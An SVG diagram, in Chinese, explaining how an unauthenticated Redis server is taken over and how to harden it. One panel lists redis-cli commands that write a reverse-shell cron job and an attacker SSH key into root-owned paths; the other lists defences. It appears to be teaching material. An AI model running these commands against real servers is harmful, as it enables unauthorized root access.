<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 480" width="100%" font-family="PingFang SC, Microsoft YaHei, sans-serif">
  <rect width="1000" height="480" fill="#f8fafc"/>
  <text x="500" y="30" font-size="16" font-weight="bold" text-anchor="middle" fill="#1a202c">Redis 未授权访问到 GetShell</text>

  <rect x="40" y="70" width="140" height="50" rx="8" fill="#fed7d7" stroke="#c53030" stroke-width="2"/>
  <text x="110" y="102" font-size="11" text-anchor="middle" fill="#c53030" font-weight="bold">① 发现 Redis</text>

  <rect x="200" y="70" width="140" height="50" rx="8" fill="#fefcbf" stroke="#b7791f" stroke-width="2"/>
  <text x="270" y="102" font-size="11" text-anchor="middle" fill="#b7791f" font-weight="bold">② 确认未授权</text>

  <rect x="360" y="70" width="140" height="50" rx="8" fill="#e9d8fd" stroke="#805ad5" stroke-width="2"/>
  <text x="430" y="102" font-size="11" text-anchor="middle" fill="#805ad5" font-weight="bold">③ 写 Crontab</text>

  <rect x="520" y="70" width="140" height="50" rx="8" fill="#c6f6d5" stroke="#38a169" stroke-width="2"/>
  <text x="590" y="102" font-size="11" text-anchor="middle" fill="#38a169" font-weight="bold">④ 写 SSH 密钥</text>

  <rect x="680" y="70" width="140" height="50" rx="8" fill="#bee3f8" stroke="#3182ce" stroke-width="2"/>
  <text x="750" y="102" font-size="11" text-anchor="middle" fill="#3182ce" font-weight="bold">⑤ 写 WebShell</text>

  <rect x="840" y="70" width="120" height="50" rx="8" fill="#f0fff4" stroke="#48bb78" stroke-width="2"/>
  <text x="900" y="102" font-size="11" text-anchor="middle" fill="#276749" font-weight="bold">⑥ 提权</text>

  <rect x="40" y="150" width="460" height="300" rx="12" fill="#fff5f5" stroke="#e53e3e" stroke-width="2"/>
  <text x="270" y="175" font-size="12" font-weight="bold" text-anchor="middle" fill="#822727">Redis 未授权利用</text>

  <text x="70" y="205" font-size="10" font-weight="bold" fill="#c53030">① 确认未授权：</text>
  <text x="70" y="225" font-size="9" fill="#2d3748">redis-cli -h target</text>
  <text x="70" y="245" font-size="9" fill="#2d3748">PING → PONG（未授权）</text>

  <text x="70" y="275" font-size="10" font-weight="bold" fill="#805ad5">② 写 Crontab：</text>
  <text x="70" y="295" font-size="9" fill="#2d3748">set msg "\n* * * * * /bin/bash -c 'bash -i...'"</text>
  <text x="70" y="315" font-size="9" fill="#2d3748">config set dir /var/spool/cron/crontabs</text>
  <text x="70" y="335" font-size="9" fill="#2d3748">config set dbfilename root</text>
  <text x="70" y="355" font-size="9" fill="#2d3748">save</text>

  <text x="70" y="385" font-size="10" font-weight="bold" fill="#dd6b20">③ 写 SSH 密钥：</text>
  <text x="70" y="405" font-size="9" fill="#2d3748">set sshkey "ssh-rsa AAAA..."></text>
  <text x="70" y="425" font-size="9" fill="#2d3748">config set dir /root/.ssh</text>
  <text x="70" y="445" font-size="9" fill="#2d3748">config set dbfilename authorized_keys</text>
  <text x="70" y="465" font-size="9" fill="#2d3748">save</text>

  <rect x="520" y="150" width="440" height="300" rx="12" fill="#f0fff4" stroke="#48bb78" stroke-width="2"/>
  <text x="740" y="175" font-size="12" font-weight="bold" text-anchor="middle" fill="#276749">防御加固</text>

  <text x="550" y="205" font-size="10" font-weight="bold" fill="#c53030">认证防护：</text>
  <text x="550" y="225" font-size="9" fill="#2d3748">requirepass 设置强密码</text>
  <text x="550" y="245" font-size="9" fill="#2d3748">rename-command FLUSHALL ""</text>
  <text x="550" y="265" font-size="9" fill="#2d3748">rename-command CONFIG ""</text>

  <text x="550" y="295" font-size="10" font-weight="bold" fill="#805ad5">网络隔离：</text>
  <text x="550" y="315" font-size="9" fill="#2d3748">bind 127.0.0.1（禁止公网）</text>
  <text x="550" y="335" font-size="9" fill="#2d3748">防火墙限制访问来源</text>

  <text x="550" y="365" font-size="10" font-weight="bold" fill="#dd6b20">目录权限：</text>
  <text x="550" y="385" font-size="9" fill="#2d3748">Redis 以低权限用户运行</text>
  <text x="550" y="405" font-size="9" fill="#2d3748">/etc/cron.d 不可写</text>
  <text x="550" y="425" font-size="9" fill="#2d3748">/root/.ssh 不可写</text>

  <text x="550" y="455" font-size="10" font-weight="bold" fill="#3182ce">版本升级：</text>
  <text x="550" y="465" font-size="9" fill="#2d3748">升级到 Redis 6+（ACL 支持）</text>
</svg>
